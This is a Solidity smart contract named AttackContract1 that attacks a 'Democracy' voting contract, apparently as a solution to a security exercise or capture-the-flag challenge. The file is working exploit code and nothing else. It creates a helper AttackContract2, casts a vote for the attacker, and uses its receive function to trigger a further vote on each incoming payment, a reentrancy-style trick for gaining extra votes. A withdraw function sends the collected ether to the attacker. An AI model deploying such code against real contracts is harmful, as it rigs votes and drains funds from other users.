// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

import "./Democracy.sol";
import "./AttackContract2.sol";

contract AttackContract1 {
    Democracy public democracy;
    AttackContract2 public attackContract2;
    address public attacker;

    constructor(Democracy _democracy) {
        attacker = msg.sender;
        democracy = _democracy;
        attackContract2 = new AttackContract2(democracy, attacker);
    }

    function withdraw() public {
        require(msg.sender == attacker, "Only attacker can withdraw money");
        attackContract2.withdraw();
        payable(attacker).transfer(address(this).balance);
    }

    function vote() public {
        democracy.vote(attacker);
    }

    receive() external payable {
        attackContract2.vote();
    } 
}